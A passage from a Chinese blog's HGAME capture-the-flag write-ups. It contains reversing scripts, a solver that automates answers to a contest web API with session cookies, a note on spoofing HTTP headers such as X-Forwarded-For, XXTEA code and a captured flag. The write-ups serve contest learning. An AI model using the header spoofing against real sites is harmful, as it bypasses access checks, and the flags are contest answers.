<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>我们可以很快发现这个是判断是否是地雷的源码，但是很明显，这也太难看懂了，因此我建议，以后反调试，只要把 cpp -&gt; c# -&gt; il -&gt; cpp 就好了，保证大部分人看裂开，但是我们其实这里有另外一种思维，源码看不懂，那看逆向 出来的 伪代码 呗。</p>
<p>ida 中可以有</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">return</span> v9 <span class="token operator">*</span> v11 <span class="token operator">*</span> v11 <span class="token operator">+</span> v11 <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v10 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v10 <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>我们再结合起来看其实就方便了很多。</p>
<p>经过测试分析，最后写出脚本<br>其中 data.py 存储着从 AFiveSecondChallenge.dll 中的一个数组结构 matrix[45][15][3]</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> data

x_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
y_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
matrix <span class="token operator">=</span> data<span class="token punctuation">.</span>matrix
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> matrix<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> matrix<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> matrix<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
            x_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
            y_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">)</span>

plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x_matrix<span class="token punctuation">,</span>y_matrix<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span>marker <span class="token operator">=</span> <span class="token string">","</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/QRCODE.jpg" alt="QRCODE"></p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK1_WP</title>
    <url>/2021/03/14/HGAME_WEEK1_WP/</url>
    <content><![CDATA[<h1 id="WEEK1-RogerThat"><a href="#WEEK1-RogerThat" class="headerlink" title="WEEK1-RogerThat"></a>WEEK1-RogerThat</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h4><h4 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h4><p>这瓜，实在是顶，一开始根本找不到它在哪实现的检测。另外一方面，等检验分数的时候已经是到顶了，但是到顶可太慢了，就算一个一个叠上去也可能掉下来。上截图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/water.jpg" alt="img"></p>
<h4 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h4><p>http-headers，也不清楚为什么复现不了，记得是改了host，referer，X-Forwarded-For，Client-IP。</p>
<h4 id="智商检测鸡（来比划比划）"><a href="#智商检测鸡（来比划比划）" class="headerlink" title="智商检测鸡（来比划比划）"></a>智商检测鸡（来比划比划）</h4><p>我的思路就是自动去算积分，好久没码代码实在有点难顶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">import</span> re

x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> <span class="token number">12</span>
b <span class="token operator">=</span> <span class="token number">8</span>
<span class="token builtin">min</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">77</span>
<span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">70</span>


url_string1<span class="token operator">=</span><span class="token string">"http://r4u.top:5000/api/verify"</span>
url_string2<span class="token operator">=</span><span class="token string">"http://r4u.top:5000/api/getQuestion"</span>
url_string3<span class="token operator">=</span><span class="token string">"http://r4u.top:5000/api/getStatus"</span>
url_flag <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000/api/getFlag"</span>

answer <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>integrate<span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
json <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span>answer<span class="token punctuation">&#125;</span>
session <span class="token operator">=</span> <span class="token string">"eyJzb2x2aW5nIjo2fQ.YBe8WQ.V44K1Uqs_lYXW2vCJUvrQQ0k3DY"</span>
<span class="token comment">#session = "eyJzb2x2aW5nIjo3fQ.YBffyA.NAuV7AWEhJSSb0HLO43yFJqPeMc"</span>
cookies <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session <span class="token operator">=</span> session<span class="token punctuation">)</span>
headers1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
            <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span><span class="token punctuation">,</span>
            <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'30'</span><span class="token punctuation">,</span>
            <span class="token string">'Origin'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
            <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

headers2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
            <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
            <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

headers3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
            <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
            <span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">,</span>
            <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
            <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

target <span class="token operator">=</span> <span class="token string">"&lt;mn>(\d&#123;1,4&#125;)&lt;/mn>"</span>
cookie_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_string2<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    target_list <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    a   <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    b   <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>target_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    answer <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>integrate<span class="token punctuation">(</span>a<span class="token operator">*</span>x<span class="token operator">+</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    answer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"%.2f"</span> <span class="token operator">%</span> answer<span class="token punctuation">)</span>
    json <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span>answer<span class="token punctuation">&#125;</span>
    cookie_list<span class="token punctuation">.</span>append

    r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_string1<span class="token punctuation">,</span>json<span class="token operator">=</span>json<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers1<span class="token punctuation">,</span>stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    r3 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_string3<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers3<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>text<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r3<span class="token punctuation">.</span>text<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    
    <span class="token comment"># "&lt;math>&lt;mrow>&lt;msubsup>&lt;mo>\u222b&lt;/mo>&lt;mrow>&lt;mo>-&lt;/mo>&lt;mn>77&lt;/mn>&lt;/mrow></span>
    <span class="token comment"># &lt;mrow>&lt;mn>70&lt;/mn>&lt;/mrow>&lt;/msubsup>&lt;mo>(&lt;/mo>&lt;mn>12&lt;/mn>&lt;mi>x&lt;/mi>&lt;m</span>
    <span class="token comment"># o>+&lt;/mo>&lt;mn>8&lt;/mn>&lt;mo>)&lt;/mo>&lt;mtext>&lt;mi>d&lt;/mi>&lt;/mtext>&lt;mi>x&lt;/mi>&lt;mtd/>&lt;/mrow>&lt;/math>"</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        session <span class="token operator">=</span> r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span>
    cookies <span class="token operator">=</span> r1<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span>

    headers1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
                <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span><span class="token punctuation">,</span>
                <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'40'</span><span class="token punctuation">,</span>
                <span class="token string">'Origin'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
                <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
                <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

    headers2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
                <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
                <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
                <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>

    headers3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'r4u.top:5000'</span><span class="token punctuation">,</span>
                <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/javascript, */*; q=0.01'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>
                <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
                <span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">,</span>
                <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
                <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://r4u.top:5000/'</span><span class="token punctuation">,</span>
                <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session='</span><span class="token operator">+</span>session<span class="token punctuation">&#125;</span>
    
<span class="token comment">#"flag":"hgame&#123;3very0ne_H4tes_Math&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h4 id="阿怕茶"><a href="#阿怕茶" class="headerlink" title="阿怕茶"></a>阿怕茶</h4><p>是一个XXTEA，抄脚本完事，不过他这个优化的写法还挺难读的。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span>  </span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  </span></span>
  
<span class="token keyword">void</span> <span class="token function">btea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  
<span class="token punctuation">&#123;</span>  
    <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>  
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>  
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment">/* Coding Part */</span>  
    <span class="token punctuation">&#123;</span>  
        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>  
        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
        <span class="token keyword">do</span>  
        <span class="token punctuation">&#123;</span>  
            sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>  
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>  
            <span class="token keyword">for</span> <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>  
            <span class="token punctuation">&#123;</span>  
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>  
            <span class="token punctuation">&#125;</span>  
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>  
        <span class="token punctuation">&#125;</span>  
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token comment">/* Decoding Part */</span>  
    <span class="token punctuation">&#123;</span>  
        n <span class="token operator">=</span> <span class="token operator">-</span>n<span class="token punctuation">;</span>  
        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>  
        sum <span class="token operator">=</span> rounds<span class="token operator">*</span>DELTA<span class="token punctuation">;</span>  
        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
        <span class="token keyword">do</span>  
        <span class="token punctuation">&#123;</span>  
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>  
            <span class="token keyword">for</span> <span class="token punctuation">(</span>p<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>  
            <span class="token punctuation">&#123;</span>  
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>  
            <span class="token punctuation">&#125;</span>  
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>  
            sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>  
        <span class="token punctuation">&#125;</span>  
